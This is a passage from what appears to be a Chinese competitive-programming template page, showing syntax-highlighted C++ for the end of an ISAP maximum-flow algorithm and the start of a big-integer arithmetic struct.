operator">=</span>INF<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>x<span class="token operator">!=</span>s<span class="token punctuation">)</span><span class="token comment">//找最小的残量值</span>        <span class="token punctuation">&#123;</span>            Edge<span class="token operator">&amp;</span>e<span class="token operator">=</span>edges<span class="token punctuation">[</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            a<span class="token operator">=</span><span class="token function">min</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>e<span class="token punctuation">.</span>cap<span class="token operator">-</span>e<span class="token punctuation">.</span>flow<span class="token punctuation">)</span><span class="token punctuation">;</span>            x<span class="token operator">=</span>edges<span class="token punctuation">[</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>from<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        x<span class="token operator">=</span>t<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>x<span class="token operator">!=</span>s<span class="token punctuation">)</span><span class="token comment">//增广</span>        <span class="token punctuation">&#123;</span>            edges<span class="token punctuation">[</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flow<span class="token operator">+=</span>a<span class="token punctuation">;</span>            edges<span class="token punctuation">[</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">^</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>flow<span class="token operator">-=</span>a<span class="token punctuation">;</span>            x<span class="token operator">=</span>edges<span class="token punctuation">[</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>from<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> a<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//逆向进行bfs</span>    <span class="token punctuation">&#123;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>vis<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>vis<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        queue<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span>q<span class="token punctuation">;</span>        q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>        d<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        vis<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> x<span class="token operator">=</span>q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> len<span class="token operator">=</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                Edge<span class="token operator">&amp;</span>e<span class="token operator">=</span>edges<span class="token punctuation">[</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>vis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>from<span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span>e<span class="token punctuation">.</span>cap<span class="token operator">></span>e<span class="token punctuation">.</span>flow<span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    vis<span class="token punctuation">[</span>e<span class="token punctuation">.</span>from<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>                    d<span class="token punctuation">[</span>e<span class="token punctuation">.</span>from<span class="token punctuation">]</span><span class="token operator">=</span>d<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                    q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>from<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">Maxflow</span><span class="token punctuation">(</span><span class="token keyword">int</span> s<span class="token punctuation">,</span><span class="token keyword">int</span> t<span class="token punctuation">)</span><span class="token comment">//根据情况前进或者后退，走到汇点时增广</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token operator">-></span>s<span class="token operator">=</span>s<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token operator">-></span>t<span class="token operator">=</span>t<span class="token punctuation">;</span>        <span class="token keyword">int</span> flow<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">bfs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            num<span class="token punctuation">[</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> x<span class="token operator">=</span>s<span class="token punctuation">;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>cur<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>d<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token operator">&lt;</span>n<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">==</span>t<span class="token punctuation">)</span><span class="token comment">//走到了汇点，进行增广</span>            <span class="token punctuation">&#123;</span>                flow<span class="token operator">+=</span><span class="token function">Augumemt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                x<span class="token operator">=</span>s<span class="token punctuation">;</span><span class="token comment">//增广后回到源点</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">int</span> ok<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>cur<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                Edge<span class="token operator">&amp;</span>e<span class="token operator">=</span>edges<span class="token punctuation">[</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>cap<span class="token operator">></span>e<span class="token punctuation">.</span>flow<span class="token operator">&amp;&amp;</span>d<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">==</span>d<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    ok<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>                    p<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token operator">=</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//记录来的时候走的边，即父边</span>                    cur<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>                    x<span class="token operator">=</span>e<span class="token punctuation">.</span>to<span class="token punctuation">;</span><span class="token comment">//前进</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>ok<span class="token punctuation">)</span><span class="token comment">//走不动了，撤退</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">int</span> m<span class="token operator">=</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//如果没有弧，那么m+1就是n，即d[i]=n</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    Edge<span class="token operator">&amp;</span>e<span class="token operator">=</span>edges<span class="token punctuation">[</span>G<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>cap<span class="token operator">></span>e<span class="token punctuation">.</span>flow<span class="token punctuation">)</span>                        m<span class="token operator">=</span><span class="token function">min</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>d<span class="token punctuation">[</span>e<span class="token punctuation">.</span>to<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">--</span>num<span class="token punctuation">[</span>d<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment">//如果走不动了，且这个距离值原来只有一个，那么s-t不连通，这就是所谓的“gap优化”</span>                num<span class="token punctuation">[</span>d<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>                cur<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>x<span class="token operator">!=</span>s<span class="token punctuation">)</span>                    x<span class="token operator">=</span>edges<span class="token punctuation">[</span>p<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>from<span class="token punctuation">;</span><span class="token comment">//退一步，沿着父边返回</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> flow<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">;</span>    ISAP sap<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cin<span class="token operator">>></span>n<span class="token operator">>></span>m<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        sap<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sap<span class="token punctuation">.</span>n<span class="token operator">=</span>n<span class="token punctuation">;</span>        sap<span class="token punctuation">.</span>m <span class="token operator">=</span> m<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>sap<span class="token punctuation">.</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> from<span class="token punctuation">,</span>to<span class="token punctuation">,</span>cap<span class="token punctuation">;</span>            cin<span class="token operator">>></span>from<span class="token operator">>></span>to<span class="token operator">>></span>cap<span class="token punctuation">;</span>            sap<span class="token punctuation">.</span><span class="token function">addedge</span><span class="token punctuation">(</span>from<span class="token punctuation">,</span>to<span class="token punctuation">,</span>cap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        cout<span class="token operator">&lt;&lt;</span>sap<span class="token punctuation">.</span><span class="token function">Maxflow</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>sap<span class="token punctuation">.</span>m<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>  </code></pre><h3 id="19-大数"><a href="#19-大数" class="headerlink" title="19. 大数"></a>19. 大数</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">bign</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> d<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> len<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>len <span class="token operator">></span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>d<span class="token punctuation">[</span>len<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> len<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token function">bign</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">bign</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">=</span> num<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">bign</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> num<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">=</span> num<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bign <span class="token keyword">operator</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> num<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">memset</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        len <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> num<span class="token punctuation">[</span>len<span class="token operator">-</span><span class="token number">1</span><span class="token operator">-</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'0'</span><span class="token punctuation">;</span>        <span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bign <span class="token keyword">operator</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%d"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token keyword">this</span> <span class="token operator">=</span> s<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    bign <span class="token keyword">operator</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        bign c <span class="token operator">=</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> b<span class="token punctuation">.</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> b<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">9</span><span class="token punctuation">)</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">%=</span><span class="token number">10</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">9</span><span class="token punctuation">)</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">%=</span><span class="token number">10</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>len<span class="token punctuation">,</span> b<span class="token punctuation">.</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> c<span class="token punctuation">.</span>len <span class="token operator">&lt;=</span> i<span class="token punctuation">)</span> c<span class="token punctuation">.</span>len <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> c<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bign <span class="token keyword">operator</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        bign c <span class="token operator">=</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> b<span class="token punctuation">.</span>len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-=</span> b<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">10</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">+=</span><span class="token number">10</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> c<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bign <span class="token keyword">operator</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span><span class="token keyword">const</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>        bign c<span class="token punctuation">;</span>        c<span class="token punctuation">.</span>len <span class="token operator">=</span> len <span class="token operator">+</span> b<span class="token punctuation">.</span>len<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> b<span class="token punctuation">.</span>len<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token operator">+</span>j<span class="token punctuation">]</span> <span class="token operator">+=</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> b<span class="token punctuation">.</span>d<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> c<span class="token punctuation">.</span>len<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/</span><span class="token number">10</span><span class="token punctuation">,</span> c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%=</span> <span class="token number">10</span><span class="token punctuation">;</span>        c<span class="token punctuation">.</span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> c<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bign <span class="token keyword">operator</span> <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>        bign c <span class="token operator">=</span> <span class="token operator">*</span><span class="token keyword">this</span><span class="token punctuation">,</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            a <span class="token operator">=</span> a<span class="token operator">*</span><span class="token number">10</span> <span class="token operator">+</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;</span> b<span class="token operator">*</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span>d<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>            a <span class="token operator">=</span> a <span class="token operator">-</span> b<span class="token operator">*</span>j<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        c<span class="token punctuation">.</span><span class="token function">clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> c<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    bign <span class="token keyword">operator</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token keyword">const</span> bign<span class="token operator">&amp;</span> b<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>        bign a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> len <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            a <span class="token operator">=</span> a<span class="token operator">*</span><span class="token number">10</span> <span class="token operator">+</span> d<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;</span> b<span class="token operator">*</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>            a <span class="token operator">=</span> a <span 